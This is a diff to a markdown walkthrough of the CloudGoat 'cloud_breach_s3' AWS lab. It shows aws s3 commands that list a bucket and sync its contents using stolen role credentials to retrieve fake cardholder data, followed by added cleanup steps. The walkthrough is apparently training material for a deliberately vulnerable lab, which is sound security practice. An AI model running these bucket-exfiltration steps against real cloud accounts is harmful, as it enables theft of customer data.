@@ -213,11 +213,11 @@ Let's see what these credentials can do
 11. Attempt to list s3 buckets
 `aws s3 ls --profile wrole`  
 Success! 
-13. Copy the discovered bucket name into a local folder, we'll name it cardholder after the bucket name
-`aws s3 cp s3://<bucket> ./cardholder --profile wrole`
-That didn't work, maybe we can sync?
-14. Sync the bucket with a local folder
-`aws s3 sync s3://<bucket> ./cardholder --profile wrole`
+13. Copy the discovered bucket name into a local folder, we'll name it cardholder after the bucket name    
+`aws s3 cp s3://<bucket> ./cardholder --profile wrole`   
+That didn't work, maybe we can sync?  
+14. Sync the bucket with a local folder   
+`aws s3 sync s3://<bucket> ./cardholder --profile wrole`  
 **Goal Achieved**
 15. Review the new folder for creepy fake PII information
 ```bash
@@ -227,8 +227,12 @@ cat cardholder/cardholder_data_secondary.csv
 cat cardholder/card
 ```
 
-
 ### Remove cloud_breach_s3
+1. Remove the cardholder folder
+`rm -rf cardholder`  
+2. Remove the scenario
+`./cloudgoat destroy cloud_breach_s3`
+3. Remove AWS CLI Credentials for wrole
 
 
 ## ec2_ssrf
